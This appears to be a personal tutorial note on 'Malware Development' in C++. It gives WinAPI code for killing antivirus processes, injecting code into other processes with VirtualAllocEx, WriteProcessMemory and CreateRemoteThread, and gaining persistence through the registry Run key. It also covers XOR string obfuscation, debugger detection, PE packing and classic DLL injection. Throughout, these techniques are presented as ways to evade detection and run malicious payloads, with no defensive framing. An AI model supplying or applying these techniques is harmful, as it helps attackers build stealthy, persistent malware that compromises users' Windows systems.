# Index 
- [[Malware Development]]
	- [[2. Key C++ Concepts for Malware]]
		- [[2.1 Windows API (WinAPI) for Malware Development]]
		- [[2.2 Code Obfuscation Techniques]]
		- [[2.3 PE File Structure and Manipulation]]
		- [[2.4 DLL Injection Techniques]]

# Windows API (WinAPI) for Malware Development

The Windows API (WinAPI) is essential for interacting with system resources. Below are critical functions and techniques used in malware development:

#### Process Creation and Manipulation
Malware often needs to create or manipulate processes to execute its payload or hide its presence.

- `CreateProcess`: This function allows a program to create a new process (such as launching a legitimate program like `notepad.exe` or `svchost.exe`) and inject code into it.
  
    Example:
    ```cpp
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    
    if (CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        // Process created successfully
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    ```

- `OpenProcess` and `TerminateProcess`: These allow malware to open and terminate processes. You can use `OpenProcess` to gain a handle to a running process and `TerminateProcess` to kill specific processes like antivirus software.

    Example:
    ```cpp
    DWORD processID = 1234; // Target process ID
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processID);
    
    if (hProcess) {
        TerminateProcess(hProcess, 0);  // Terminate the process
        CloseHandle(hProcess);
    }
    ```

#### Memory Manipulation
Malware often needs to allocate memory in other processes and manipulate it to execute arbitrary code. These are key APIs:

- `VirtualAllocEx`: Allocates memory in the address space of another process. This is used in process injection techniques.

    Example:
    ```cpp
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ```

- `WriteProcessMemory`: Writes data to the memory space of a target process.

    Example:
    ```cpp
    WriteProcessMemory(hProcess, pRemoteMemory, buffer, bufferSize, NULL);
    ```

- `CreateRemoteThread`: After writing malicious code to the target processâ€™s memory, you can use `CreateRemoteThread` to execute the code.

    Example:
    ```cpp
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteMemory, NULL, 0, NULL);
    ```

These three functions are frequently used in DLL injection and process hollowing techniques.

#### File and Registry Manipulation
Malware often needs to interact with the filesystem or the Windows registry to achieve persistence, execute commands, or gather information.

- File I/O: Use `CreateFile`, `WriteFile`, `ReadFile`, and `DeleteFile` for file manipulation. Malware can use this to create or modify files.
  
    Example:
    ```cpp
    HANDLE hFile = CreateFile("C:\\test.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, "Malware!", 8, &written, NULL);
        CloseHandle(hFile);
    }
    ```

- Registry Manipulation: Malware can modify the registry to set itself to run on startup. Commonly, it uses `RegOpenKeyEx`, `RegSetValueEx`, and `RegCloseKey`.

    Example:
    ```cpp
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, "MyMalware", 0, REG_SZ, (BYTE*)"C:\\malware.exe", strlen("C:\\malware.exe") + 1);
    RegCloseKey(hKey);
    ```

# Code Obfuscation Techniques

Obfuscation helps evade antivirus (AV) detection by making the malware binary harder to analyze. Here are common obfuscation techniques:

#### String Obfuscation
Plain strings in malware (e.g., URLs, file paths) are easily recognized by AV solutions. Encrypt or obfuscate these strings and decrypt them only when needed at runtime.

Example (simple XOR encryption):
```cpp
std::string encrypt(std::string input, char key) {
    std::string output = input;
    for (int i = 0; i < input.size(); i++) {
        output[i] = input[i] ^ key;  // XOR encryption
    }
    return output;
}

std::string decrypt(std::string input, char key) {
    return encrypt(input, key);  // XOR decryption is the same as encryption
}
```

In practice, you might use more complex algorithms, such as AES or custom schemes, to obfuscate strings or code blocks.

#### Control Flow Obfuscation
This technique modifies the structure of the code to confuse static analysis tools. Malware can use complex conditional statements and jumps to break up linear code flow.

Example (fake conditionals):
```cpp
void maliciousAction() {
    if (time(NULL) % 2 == 0) {  // Dummy condition
        return;
    }
    // Actual malicious code here
}
```

#### Function Pointers and Dynamic Function Resolution
Instead of calling functions directly, resolve them dynamically at runtime using `GetProcAddress` and `LoadLibrary`. This evades static detection by hiding function calls in plain sight.

Example:
```cpp
typedef BOOL(WINAPI* pIsDebuggerPresent)();
HMODULE hKernel32 = LoadLibrary("kernel32.dll");
pIsDebuggerPresent IsDebuggerPresent = (pIsDebuggerPresent)GetProcAddress(hKernel32, "IsDebuggerPresent");

if (IsDebuggerPresent()) {
    // Debugger detected
}
```

# PE File Structure and Manipulation

Understanding the Portable Executable (PE) file format is critical for bypassing static analysis and manipulating malware binaries. The PE format defines the structure of executables (EXE, DLL) in Windows.

#### Key Sections of the PE File
- Headers: Contain metadata about the binary, including the entry point.
- Text (.text) Section: Contains the executable code.
- Data (.data, .rdata) Section: Contains global variables and other data.
- Resource (.rsrc) Section: Stores application resources like icons or version info.

You can manipulate the PE headers or sections to evade static signature detection, such as:
- Changing entry point: Modify the EntryPoint in the PE header to mislead static analysis tools.
- Packing: Compress or encrypt the .text section of the binary and unpack it at runtime.

You can use libraries such as [pefile](https://github.com/erocarrera/pefile) in Python to parse and manipulate PE files or do it directly in C++ with the appropriate WinAPI functions.

# DLL Injection Techniques

DLL injection allows you to run arbitrary code in the context of another process. Common injection methods include:

#### Classic DLL Injection
1. OpenProcess to gain access to a target process.
2. VirtualAllocEx to allocate memory in the target process.
3. WriteProcessMemory to write the path of the DLL to be injected.
4. CreateRemoteThread to execute `LoadLibrary` in the context of the target process, which loads your malicious DLL.

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(hProcess, pDllPath, dllPath, strlen(dllPath), NULL);
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibrary, pDllPath, 0, NULL);
```

#### Reflective DLL Injection
This is an advanced technique where the DLL is injected into memory without being written to disk, thus avoiding file-based detection. In reflective injection, you build the code for the DLL loader, load it into memory, and execute it.